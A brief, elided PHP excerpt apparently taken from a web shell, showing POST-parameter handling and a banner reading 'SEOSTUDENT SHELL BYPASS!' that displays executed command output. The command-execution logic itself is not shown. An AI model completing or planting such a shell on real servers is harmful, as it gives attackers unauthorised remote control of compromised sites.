...
if (@isset($_POST["a"])) {
    ...
    if (isset($_POST['subcmd'])) {
        ...
        echo "<center>SEOSTUDENT SHELL BYPASS!</center>";
        echo "<br>";
        echo '$SEOSTUDENT: ';
        echo $output;
        echo "</pre>";
